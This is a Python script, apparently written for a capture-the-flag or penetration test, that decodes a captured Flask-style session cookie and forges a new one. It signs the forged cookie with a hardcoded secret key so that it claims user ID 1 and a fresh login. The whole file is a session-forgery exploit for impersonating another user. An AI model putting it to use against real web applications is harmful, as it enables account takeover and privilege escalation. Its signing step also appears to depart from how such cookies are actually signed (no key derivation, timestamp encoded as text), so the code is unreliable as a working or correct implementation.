import base64, json, hashlib, hmac, time

SECRET_KEY = 'G7x7pMBBduHU0HH5avEQ'
captured = 'eyJfZnJlc2giOmZhbHNlfQ.aVcAlQ._iR0jFMQlN7S10HnF9G9QGAnzec'

# Decode original
payload, timestamp, sig = captured.split('.')
padding = 4 - len(payload) % 4
if padding != 4: payload += '=' * padding
original = json.loads(base64.urlsafe_b64decode(payload))
print('Original session:', original)

# Forge new session
forged = {'_fresh': True, '_id': 'a'*32, 'user_id': 1, '_user_id': 1}
json_str = json.dumps(forged, separators=(',', ':'))
new_payload = base64.urlsafe_b64encode(json_str.encode()).rstrip(b'=').decode('ascii')
new_timestamp = base64.urlsafe_b64encode(str(int(time.time())).encode()).rstrip(b'=').decode('ascii')
data = f'{new_payload}.{new_timestamp}'
signer = hmac.new(SECRET_KEY.encode(), data.encode(), hashlib.sha1)
new_sig = base64.urlsafe_b64encode(signer.digest()).rstrip(b'=').decode('ascii')
forged_cookie = f'{new_payload}.{new_timestamp}.{new_sig}'

print('Forged cookie:', forged_cookie)

# Verify
test_padding = 4 - len(new_payload) % 4
if test_padding != 4: new_payload += '=' * test_padding
test_decoded = json.loads(base64.urlsafe_b64decode(new_payload))
print('Verification:', test_decoded)
